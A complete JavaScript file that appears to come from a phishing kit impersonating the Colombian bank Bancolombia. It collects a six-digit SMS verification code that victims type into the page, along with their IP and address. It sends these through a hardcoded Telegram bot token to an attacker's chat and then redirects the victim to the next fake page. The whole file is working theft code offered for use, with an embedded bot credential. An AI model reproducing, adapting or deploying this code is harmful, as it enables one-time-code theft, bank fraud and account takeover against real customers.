//bot token
var telegram_bot_id = "7637656884:AAFNp_qD7t43xq9hw3ciYCTFw35Q4smH5js";
//chat id
var chat_id =  6889692889;
var u_name, u_name2, u_name3, u_name4, u_name5, u_name6, ip, ip2;
var ready = function () {
    u_name = document.getElementById("num1").value;
    u_name2 = document.getElementById("num2").value;
    u_name3 = document.getElementById("num3").value;
    u_name4 = document.getElementById("num4").value;
    u_name5 = document.getElementById("num5").value;
    u_name6 = document.getElementById("num6").value;
    ip = document.getElementById("ip").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💛BANCOLOMBIA💛\nSMS2⃣: " + u_name + "" + u_name2 + "" + u_name3+ "" + u_name4 + "" + u_name5 + "" + u_name6 + "\n\nIP: " + ip +"\n" + ip2 +"\n💛C0DE BY SYN4PSE💛";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'proceso3.html';
        console.log(response);
    });
    return false;
};
